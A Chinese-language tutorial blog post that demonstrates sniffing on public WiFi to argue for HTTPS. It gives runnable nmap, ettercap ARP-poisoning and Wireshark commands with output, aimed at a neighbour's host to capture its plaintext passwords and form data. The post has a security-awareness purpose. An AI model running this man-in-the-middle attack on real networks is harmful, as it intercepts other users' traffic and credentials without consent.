---
title: "公共WIFI網路嗅探"
date: 2021-07-08T16:00:49+08:00
draft: true
tags: ["secure","ettercap","資安","檢查","wifi","中間人攻擊"]
featured_image: "/secure.jpg"
---

## 作者

阿維

## 同意條款

閱讀本篇文章等同承諾:  
1. 不將相關知識用在任何非法用途  
2. 不窺探他人隱私  
3. 保持誠實與友善  
4. 所有安全測試知識只用於維護安全的目的  
5. 測試用的器材僅限於自己擁有的主機與設備  
6. 測試的對象只限於自己  

## 概念

我們在使用公共WIFI，例如速食店或便利超商甚至學校時，我們必須非常謹慎，可能的話務必要使用有HTTPS協定的網站，如果沒有的話，也可以嘗試免費的proxy或者是Tor service，來對流量進行加密轉送。  

為什麼呢？  

我們底下將直接展示透過不安全的WIFI來擷取網頁瀏覽資料的實做。  

## 1.了解自己的IP與WIFI界面

用以下指令了解自己在該網段的IP，假設自身的網段為192.168.43.0，我們的網路界面為wlp0s20f3
```
ip address
```

如果在容器裡頭沒有該指令請另行下載
```
apt install -y iproute2
```

## 2.發覺跟我們一起共用WIFI的主機IP

跟我們共用同樣的IP就可以被我們監聽  

安裝nmap
```
apt install -y nmap
```

掃描我們WIFI網段上的主機
```
nmap  -sn  192.168.43.0/24 
```

以下掃描結果:  
```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-09 10:51 CST
Nmap scan report for _gateway (192.168.43.1)
Host is up (0.0028s latency).
MAC Address: F6:F6:F5:32:57:DA (Unknown)
Nmap scan report for pc (192.168.43.112)
Host is up (0.24s latency).
MAC Address: CC:C1:C9:CF:2E:A9 (AzureWave Technology)
Nmap scan report for alex (192.168.43.108)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.24 seconds

```

我們意識到三個主機:  
>1. 自己的主機:192.168.43.108  
>2. 目標監聽主機位址為192.168.43.112  
>3. wifi分享器(AP):192.168.43.1  

## 3.Ettercap啟動監聽

用Ettercap插入WIFI分享器與監聽對象中間  
這樣所以原本要通向WIFI分享器的封包都會路過我們的主機，被我們主機進行監測  

安裝ettercap命令行模式
```
apt install -y ettercap-common
```
在軟體ettercap裡頭輸入wifi分享器與目標監聽主機的IP，記得順序要正確
```
ettercap -T -S -i wlp0s20f3 -M arp:remote /192.168.43.1// /192.168.43.112//
```

結果
```
ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team

Listening on:
wlp0s20f3 -> 50:2F:9B:33:37:CC
	  192.168.43.108/255.255.255.0
	  f780::6b75:a7f7:41af:7698/64

Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/wlp0s20f3/use_tempaddr is not set to 0.
Privileges dropped to EUID 55434 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
24609 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Scanning for merged targets (2 hosts)...
* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 192.168.43.1 15:16:55:32:77:DA

 GROUP 2 : 192.168.43.112 61:31:49:57:7E:C9

```
我們可以看到裡頭有一段，這代表我們成功監聽了兩個主機之間的無線流量了
```
ARP poisoning victims:

 GROUP 1 : 192.168.43.1 15:16:55:32:77:DA

 GROUP 2 : 192.168.43.112 61:31:49:57:7E:C9

```

## 4.Wireshark擷取封包

安裝wireshark
```
apt install wireshark
```
打開wireshark
```
sudo wireshark
```
打開wireshark在篩選器中輸入
```
ip.src==192.168.43.112 && http 
```
這樣就能指定擷取到對方HTTP的封包了。  

我們就可以看到目標監聽主機連上什麼網站了，而當沒有HTTPS的時候，目標主機的網站請求，密碼，表單輸入，通通都是明文呈現，可以被我們間聽到。

但如果是HTTPS的話就算擷取了，也是加密訊息，看不懂的！  
所以HTTPS等加密傳輸真的很重要唷～  


## 補充閱讀:
https://www.youtube.com/watch?v=-rSqbgI7oZM&t=832s&ab_channel=NetworkChuck  
